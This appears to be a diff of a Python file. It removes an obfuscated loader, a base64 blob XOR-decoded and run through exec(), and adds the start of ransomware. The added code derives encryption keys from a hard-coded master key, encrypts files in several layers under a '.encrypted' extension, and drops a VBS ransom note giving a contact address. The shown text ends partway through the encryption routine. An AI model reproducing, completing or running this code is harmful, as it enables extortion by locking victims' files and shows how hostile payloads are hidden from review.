@@ -1,9 +1,242 @@
-import base64
-def _x(d,k):
-    r=[]
-    for i,c in enumerate(d):
-        r.append(chr(ord(c)^ord(k[i%len(k)])))
-    return ''.join(r)
-_k="bf3a82e1dac503de"
-_c=base64.b64decode("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").decode()
-exec(_x(_c,_k))
+import os
+import secrets
+import hashlib
+import hmac
+import struct
+
+
+MASTER_KEY_FIXED = b"%N34iEx$ZSWCfYGhFPeXu5#K8mQ@vL2pR9tB6wJ&D7nH3sA1uI0oY4zTGhFPeXu5#K8mQ@vL2pRCfYGhFPeXu5#K8mQ4iEx$ZSWCfYGhFPe"
+_SALT_VARIANT = bytes.fromhex("50714d80eb8d4509a30216aea9f033ba323a65edb4cd6ddf5a864a84d1d9d5f4")
+
+
+def _import_crypto():
+    try:
+        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+        from cryptography.hazmat.primitives import hashes
+        from cryptography.hazmat.primitives.kdf.hkdf import HKDF
+        from cryptography.hazmat.primitives import padding as pad_module
+        from cryptography.hazmat.backends import default_backend
+        return {
+            'Cipher': Cipher,
+            'algorithms': algorithms,
+            'modes': modes,
+            'hashes': hashes,
+            'HKDF': HKDF,
+            'pad_module': pad_module,
+            'backend': default_backend()
+        }
+    except ImportError:
+        return None
+
+
+def crear_vbs_notificacion(ruta_archivo):
+    try:
+        nombre_base = os.path.splitext(ruta_archivo)[0]
+        vbs_path = nombre_base + ".vbs"
+        vbs_content = """On Error Resume Next
+MsgBox "Your files have been encrypted. Contact: onder01@tutamail.com", vbCritical, "Encrypted"
+WScript.Quit
+"""
+        with open(vbs_path, "w", encoding="utf-8") as f:
+            f.write(vbs_content)
+        return True
+    except:
+        return False
+
+
+class EncriptadorMilitar:
+    TAMANO_PEQUENO = 1 * 1024 * 1024
+    TAMANO_MEDIANO = 10 * 1024 * 1024
+    TAMANO_GRANDE = 50 * 1024 * 1024
+    
+    def __init__(self):
+        self.crypto = _import_crypto()
+        if not self.crypto:
+            raise ImportError("Cryptography not available")
+        self.ext = ".encrypted"
+        self._init_entropy_pool()
+        self.stats = {'12_capas': 0, '8_capas': 0, '5_capas': 0, '3_capas': 0}
+    
+    def _init_entropy_pool(self):
+        self.entropy_pool = bytearray(secrets.token_bytes(4096))
+    
+    def _get_entropy(self, size):
+        new_entropy = secrets.token_bytes(size)
+        for i in range(size):
+            self.entropy_pool[i % len(self.entropy_pool)] ^= new_entropy[i]
+        h = hashlib.blake2b(bytes(self.entropy_pool), digest_size=size)
+        return h.digest()
+    
+    def _derive_key(self, master, salt, info, length=32):
+        kdf = self.crypto['HKDF'](
+            algorithm=self.crypto['hashes'].SHA3_512(),
+            length=length,
+            salt=salt + _SALT_VARIANT[:16],
+            info=info,
+            backend=self.crypto['backend']
+        )
+        return kdf.derive(master)
+    
+    def _poly1305_mac(self, key, data):
+        h = hashlib.blake2b(key + data, digest_size=16)
+        return h.digest()
+    
+    def _determinar_capas(self, tamano):
+        if tamano < self.TAMANO_PEQUENO:
+            return 12, '12_capas'
+        elif tamano < self.TAMANO_MEDIANO:
+            return 8, '8_capas'
+        elif tamano < self.TAMANO_GRANDE:
+            return 5, '5_capas'
+        else:
+            return 3, '3_capas'
+    
+    def _flatten_keys(self, claves_usadas):
+        result = b''
+        for item in claves_usadas:
+            if isinstance(item, bytes):
+                result += item
+            elif isinstance(item, tuple):
+                for subitem in item:
+                    if isinstance(subitem, bytes):
+                        result += subitem
+        return result
+    
+    def encriptar(self, ruta):
+        try:
+            if not os.path.exists(ruta) or ruta.endswith(self.ext):
+                return False
+            try:
+                tamano = os.path.getsize(ruta)
+                with open(ruta, 'rb') as f:
+                    datos = f.read()
+            except:
+                return False
+            num_capas, tipo_capas = self._determinar_capas(tamano)
+            self.stats[tipo_capas] += 1
+            file_master = self._derive_key(MASTER_KEY_FIXED, b'file_salt', b'file_master', 64)
+            claves_usadas = []
